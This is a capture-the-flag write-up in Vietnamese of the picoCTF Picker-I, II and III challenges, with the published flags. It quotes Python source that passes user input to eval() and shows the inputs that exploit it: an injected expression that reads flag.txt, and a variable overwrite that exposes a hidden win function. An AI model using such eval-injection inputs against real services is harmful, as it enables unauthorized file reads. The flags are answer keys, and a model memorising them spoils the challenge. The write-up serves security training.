# Picker-I & Picker-II

Để exploit được, lỗi ta sẽ cần xem xét hàm win:
```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

Ở đây ta thấy flag sẽ được đọc từ file flag.txt. Tiếp theo ta xem xét câu lệnh:
```python
while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      print(user_input + '()')
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
```

Ở đây user_input phải khác "win", nhưng ta có thể gọi hàm open để đọc giá trị từ file flag.txt. Tuy nhiên nó sẽ không in ra nội dung của file do đó ta phải sử dụng được hàm print ở đây.

Để làm được điều này, ta chỉ cần nhập user_input từ bàn phím như sau:
```
==> print(open('flag.txt', 'r').read()), print
```

## Flag:
```
picoCTF{4_d14m0nd_1n_7h3_r0ugh_ce4b5d5b}
```

# Picker-III

Để exploit được lỗi, ta cần tìm cách thay đổi func_table từ đó thêm hàm win vào là được.

``len(func_table)`` có giá trị là 128, ta sẽ xóa hàm getRandomNumber và thay thế bằng hàm win sau đó thêm các dấu cách sao cho độ dài func_table đủ 128 kí tự.

```python
func_table = '''print_table                     read_variable                   write_variable                  win                             '''
```

Chọn 3, đặt tên biến là func_table để ghi đè giá trị mới lên giá trị cũ. Sau đó value thì đặt là func_table có hàm win như ở trên:

```
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: '''print_table                     read_variable                   write_variable                  win                             '''
```

Sau đó chọn 1 để hiện ra danh sách các hàm, lúc này ta thấy hàm win.
Chọn 4 để gọi hàm win, và ta thấy đoạn hex.

```
==> 1
1: print_table
2: read_variable
3: write_variable
4: win
==> 4
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d
```

Giải mã đoạn hex trên bằng python hoặc CyberChef là được:
```python
>>> bytes.fromhex('0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d'.replace('0x', '').replace(' ', '')).decode('utf-8')
'picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}'
```

## Flag:
```
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}
```
